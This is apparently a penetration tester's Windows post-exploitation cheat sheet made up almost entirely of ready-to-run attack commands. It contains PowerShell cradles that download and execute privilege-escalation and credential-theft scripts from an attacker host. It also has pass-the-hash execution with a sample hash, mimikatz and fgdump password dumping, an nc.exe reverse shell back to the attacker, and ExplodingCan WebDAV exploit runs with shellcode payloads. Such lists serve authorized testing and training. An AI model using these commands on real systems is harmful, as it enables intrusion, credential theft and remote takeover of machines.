[+]======================== Windows Enumeration Commands =======================[+]

//$source_ip/$smb_share/scripts_windows/bin/whoami.exe

# Exploit suggestors
python.exe //$source_ip/$smb_share/scripts_windows/windows-exploit-suggester.py
//$source_ip/$smb_share/scripts_windows/Watson_Net35.exe
//$source_ip/$smb_share/scripts_windows/Watson_Net45.exe
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/scripts_windows/Sherlock.ps1'); Find-AllVulns"
cd tools_windows/Windows-Exploit-Suggester; python windows-exploit-suggester.py --database `ls -la 20* | cut -d' ' -f9 | sort -nr | head -n 1` --systeminfo win7sp1-systeminfo.txt

# Privilege escalation
//$source_ip/$smb_share/scripts_windows/windows-privesc-check2.exe --audit -a -o wpc-report
//$source_ip/$smb_share/scripts_windows/windows-privesc-check2.exe --dump -a > wpc-dump

powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/scripts_windows/PowerSploit/Privesc/PowerUp.ps1'); Invoke-AllChecks"
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/scripts_windows/PowerSploit/Exfiltration/Get-GPPAutologon.ps1'); Get-GPPAutologon"
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/scripts_windows/PowerSploit/Exfiltration/Get-GPPPassword.ps1'); Get-GPPPassword"
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/scripts_windows/PowerSploit/Exfiltration/Get-VaultCredential.ps1'); Get-VaultCredential"

powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/exploits_windows_collections/windows-kernel-exploits/MS16-032/MS16-032.ps1'); Invoke-MS16-032"

# Invoke command
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/scripts_windows/Invoke-TheHash/Invoke-WMIExec.ps1'); Invoke-WMIExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose"
powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/scripts_windows/Invoke-TheHash/Invoke-SMBExec.ps1'); Invoke-SMBExec -Target localhost -Username alice -Hash aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE -Command 'cmd' -verbose"

//$source_ip/$smb_share/scripts_windows/pstools/PsExec.exe -accepteula \\localhost -u alice -p aliceishere cmd

# Reverse shell
//$source_ip/payloads_windows/shell_reverse_tcp_x86_shikata_ga_nai.exe
//$source_ip/payloads_windows/shell_reverse_tcp_x64_shikata_ga_nai.exe

# Password dumping
//$source_ip/$smb_share/scripts_windows/bin/fgdump/fgdump.exe
//$source_ip/$smb_share/scripts_windows/wce.exe

# Network monitoring
//$source_ip/$smb_share/scripts_windows/tcpdump.exe -s 0 -w tcpdump.out
//$source_ip/$smb_share/scripts_windows/tcpdump.exe port 80 -s 0 -w tcpdump.out 
//$source_ip/$smb_share/scripts_windows/tcpdump.exe net 10.10.10.0/24 -s 0 -w tcpdump.out 
//$source_ip/$smb_share/scripts_windows/tcpdump.exe host 10.10.10.10 -s 0 -w tcpdump.out 

# Find and decrypt cpasswords on domain controller (user need permission to map/mount share)
//$source_ip/$smb_share/scripts_windows/gp3finder.exe -A -t DOMAIN_CONTROLLER -u DOMAIN\USER

# Find and decrypt cpasswords on the local machine
//$source_ip/$smb_share/scripts_windows/gp3finder.exe -A -l

# Services with write access
//$source_ip/$smb_share/scripts_windows/accesschk.exe -uwcqv * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwcqv * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwcqv * /accepteula

# Services with write access to user testuser
//$source_ip/$smb_share/scripts_windows/accesschk.exe -uwcqv "testuser" * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwcqv "testuser" * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwcqv "testuser" * /accepteula

# Services with write access for Authenticated Users
//$source_ip/$smb_share/scripts_windows/accesschk.exe -uwcqv "Authenticated Users" * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwcqv "Authenticated Users" * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwcqv "Authenticated Users" * /accepteula

# Services with write access for Everyone
//$source_ip/$smb_share/scripts_windows/accesschk.exe -uwcqv "Everyone" * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwcqv "Everyone" * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwcqv "Everyone" * /accepteula

# Services details for all services
//$source_ip/$smb_share/scripts_windows/accesschk.exe -ucqv * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -ucqv * /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -ucqv * /accepteula

# Services details for Spooler
//$source_ip/$smb_share/scripts_windows/accesschk.exe -ucqv Spooler /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -ucqv Spooler /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -ucqv Spooler /accepteula

# Weak file permissions
//$source_ip/$smb_share/scripts_windows/accesschk.exe -dqv "C:\" /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -dqv "C:\" /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -dqv "C:\" /accepteula

# Write access to file for Users
//$source_ip/$smb_share/scripts_windows/accesschk.exe -uwdqs "Users" "C:" /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwdqs "Users" "C:\" /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwdqs "Users" "C:\" /accepteula

# Write access to file for Authenticated Users
//$source_ip/$smb_share/scripts_windows/accesschk.exe -uwdqs "Authenticated Users" "C:\" /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwdqs "Authenticated Users" "C:\" /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwdqs "Authenticated Users" "C:\" /accepteula

# Write access to file for Everyone
//$source_ip/$smb_share/scripts_windows/accesschk.exe -uwdqs "Everyone" "C:\" /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2003-xp.exe -uwdqs "Everyone" "C:\" /accepteula
//$source_ip/$smb_share/scripts_windows/accesschk-2008-vista.exe -uwdqs "Everyone" "C:\" /accepteula

# Find servive unquote paths
#wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """
#gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

# Download file
//$source_ip/$smb_share/scripts_windows/bin/wget.exe url

# Copy windows binaries
copy //$source_ip/$smb_share/scripts_windows/bin/Regexe.exe
copy //$source_ip/$smb_share/scripts_windows/bin/regedit.exe
copy //$source_ip/$smb_share/scripts_windows/bin/nc.exe
copy //$source_ip/$smb_share/scripts_windows/bin/wget.exe
copy //$source_ip/$smb_share/scripts_windows/bin/whoami.exe

# Run command with credentials
$username = 'alice'
$password = 'aliceishere'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securepassword
Start-Process '//$source_ip/$smb_share/scripts_windows/bin/nc.exe' -ArgumentList '-e cmd.exe $source_ip $source_port' -Credential $credential


reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

privilege::debug
sekurlsa::logonPasswords full
sekurlsa::wdigest


# Shortcuts 
# nc -lvnp 4444
# ipconfig /a
# netstat -an
systeminfo
# arp -a
# net users 
# route PRINT
nbtstat 
nbtscan


windows/repair/sam
windows/repair/sYSTEM

dir /s /a C:\Users

dir /a /s C:\Windows\Tasks


netsh firewall show status
netsh firewall show config


driverquery

python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target payloads_windows/shell_reverse_tcp_x86_shikata_ga_nai.bin
python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target payloads_windows/shell_reverse_tcp_x64_shikata_ga_nai.bin
python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target payloads_windows/shell_bind_tcp_x86_shikata_ga_nai.bin
python exploits_windows/webdav/ScStoragePathFromUrl-explodingcan.py http://$target payloads_windows/shell_bind_tcp_x64_shikata_ga_nai.bin
